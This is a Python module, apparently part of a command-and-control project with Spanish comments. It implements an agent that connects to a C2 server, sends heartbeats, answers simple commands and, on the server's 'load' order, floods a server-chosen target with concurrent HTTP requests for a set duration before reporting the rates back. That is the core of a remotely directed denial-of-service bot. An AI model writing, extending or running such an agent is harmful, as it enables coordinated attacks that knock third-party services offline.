"""Cliente TCP del agente: sesión con el servidor C2.

Funciones:
- Conexión TCP al C2 (dirección configurable por variables de entorno)
- Envío de hello y heartbeat periódico
- Respuesta a ping, info y echo
- Carga HTTP controlada (load) en segundo plano, cancelable con stop
- Manejo de error y bye
- Código de salida para la política de reconexión
"""
from __future__ import annotations

import asyncio
import contextlib

from .config import C2_HOST, C2_PORT
from .identity import build_hello, build_heartbeat
from .load_command import run_load
from .protocol import decode_message, encode_message

HEARTBEAT_INTERVAL = 10
MAX_MESSAGE_SIZE = 65536
CONNECT_TIMEOUT = 5

# Códigos de salida de la sesión TCP
EXIT_STOP = 0   # finalizar sin reconectar (stop, bye o error de autenticación)
EXIT_RETRY = 1  # reconectar (conexión perdida o servidor ocupado)


async def receive_messages(reader, writer, send_message, start_load, stop_load):
    """Recibe mensajes del C2 y devuelve el código de salida de la sesión."""
    while True:
        try:
            raw = await reader.readline()
        except asyncio.LimitOverrunError:
            print("Mensaje demasiado grande.")
            return EXIT_RETRY

        if not raw:
            print("El servidor cerró la conexión.")
            return EXIT_RETRY

        if len(raw) > MAX_MESSAGE_SIZE:
            print("Mensaje demasiado grande.")
            return EXIT_RETRY

        try:
            message = decode_message(raw)
        except ValueError as error:
            print(f"Mensaje inválido: {error}")
            continue

        message_type = message.get("type")

        if message_type == "command":
            name = message.get("name")

            if name == "load":
                await start_load(message)
                continue

            if name == "stop":
                await stop_load()
                try:
                    response = dispatch_result(message)
                except (ValueError, KeyError) as error:
                    response = error_result(message, error)
                await send_message(response)
                print("Detenido por el servidor.")
                return EXIT_STOP

            if name in ("ping", "info", "echo"):
                try:
                    response = dispatch_result(message)
                except (ValueError, KeyError) as error:
                    response = error_result(message, error)
                await send_message(response)
                print(f"Comando recibido: {name} ({message.get('id')}) -> resultado enviado")
                continue

            await send_message(error_result(message, "Comando no permitido"))
            print(f"Comando rechazado: {name}")

        elif message_type == "bye":
            await stop_load()
            print("El servidor solicitó la desconexión.")
            return EXIT_STOP

        elif message_type == "error":
            code = message.get("code", "desconocido")
            await stop_load()
            print(f"Error del servidor: {code}")
            return EXIT_RETRY if code == "busy" else EXIT_STOP

        else:
            print(f"Mensaje ignorado: {message_type}")


def dispatch_result(message: dict) -> dict:
    """Despacha un comando y devuelve su frame result."""
    from .command_dispatcher import dispatch_command

    return dispatch_command(message)


def error_result(message: dict, error) -> dict:
    """Construye un frame result de error para un comando."""
    return {
        "type": "result",
        "id": message.get("id"),
        "status": "error",
        "data": {"error": str(error)},
    }


async def send_heartbeats(send_message):
    """Envía heartbeat cada diez segundos mientras la sesión esté activa."""
    while True:
        await asyncio.sleep(HEARTBEAT_INTERVAL)
        await send_message(build_heartbeat())


async def connect_c2(
    agent_id: str,
    secret: str = "",
    host: str = C2_HOST,
    port: int = C2_PORT,
) -> int:
    """Establece la sesión con el C2 y devuelve el código de salida."""
    print("\nConectando al servidor C2...")
    print(f"Destino: {host}:{port}")
    print(f"Agente: {agent_id}")
    print("Presione Ctrl+C para desconectar.")

    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(host, port, limit=MAX_MESSAGE_SIZE),
        timeout=CONNECT_TIMEOUT,
    )

    write_lock = asyncio.Lock()
    load_task = None

    async def send_message(message: dict) -> None:
        async with write_lock:
            writer.write(encode_message(message))
            await writer.drain()

    async def stop_load() -> None:
        nonlocal load_task
        if load_task is not None and not load_task.done():
            load_task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await load_task
        load_task = None

    async def run_load_command(message: dict) -> None:
        nonlocal load_task
        command_id = message.get("id")
        args = message.get("args") or {}
        target = str(args.get("target", ""))
        duration = args.get("duration", 30)
        concurrency = args.get("concurrency", 20)
        print(f"Carga iniciada: {target} durante {duration}s con {concurrency} conexiones")
        try:
            data = await run_load(target, duration, concurrency)
            reply = {
                "type": "result",
                "id": command_id,
                "status": "ok",
                "data": data,
            }
            print(f"Carga finalizada: enviadas={data['sent']} errores={data['errors']} rps={data['rps']}")
        except asyncio.CancelledError:
            print("Carga cancelada.")
            raise
        except Exception as exc:
            reply = error_result(message, exc)
            print(f"Carga fallida: {exc}")
        with contextlib.suppress(Exception):
            await send_message(reply)
        load_task = None

    async def start_load(message: dict) -> None:
        nonlocal load_task
        if load_task is not None and not load_task.done():
            await send_message(error_result(message, "carga ya en curso"))
            return
        load_task = asyncio.create_task(run_load_command(message))

    receiver = None
    heartbeat = None
    exit_code = EXIT_RETRY

    try:
        await send_message(build_hello(agent_id, secret))
        print("HELLO enviado.")

        receiver = asyncio.create_task(
            receive_messages(reader, writer, send_message, start_load, stop_load)
        )
        heartbeat = asyncio.create_task(send_heartbeats(send_message))

        done, pending = await asyncio.wait(
            {receiver, heartbeat},
            return_when=asyncio.FIRST_COMPLETED,
        )

        if receiver in done:
            exit_code = receiver.result()

        for task in pending:
            task.cancel()

        for task in pending:
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await task

    finally:
        await stop_load()

        for task in (receiver, heartbeat):
            if task is not None and not task.done():
                task.cancel()
                with contextlib.suppress(asyncio.CancelledError, Exception):
                    await task

        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()

        print("Conexión finalizada.")

    return exit_code
